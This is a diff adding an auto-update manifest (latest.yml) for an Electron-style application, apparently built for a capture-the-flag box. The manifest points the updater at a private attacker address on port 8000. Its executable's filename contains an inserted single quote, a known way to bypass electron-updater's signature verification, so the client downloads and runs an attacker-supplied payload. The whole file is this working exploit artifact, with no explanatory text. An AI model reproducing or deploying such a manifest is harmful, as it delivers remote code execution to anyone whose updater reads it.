@@ -1,0 +1,8 @@
+version: 1.2.3
+files:
+  url: http://10.10.14.22:8000/v’ulnerable-app-setup-1.2.3.exe
+  sha512: DoadEQyA2xJ8SYgHP5+s861nzxGmymqQgj4VsVTN+3wJlFnlCFmxbDcAvp5kjHPC0TKSKBeDGtjgB9VbHkIh2A==
+  size: 7168
+path: http://10.10.14.22:8000/v’ulnerable-app-setup-1.2.3.exe
+sha512: DoadEQyA2xJ8SYgHP5+s861nzxGmymqQgj4VsVTN+3wJlFnlCFmxbDcAvp5kjHPC0TKSKBeDGtjgB9VbHkIh2A==
+releaseDate: '2019-11-20T11:17:02.627Z'
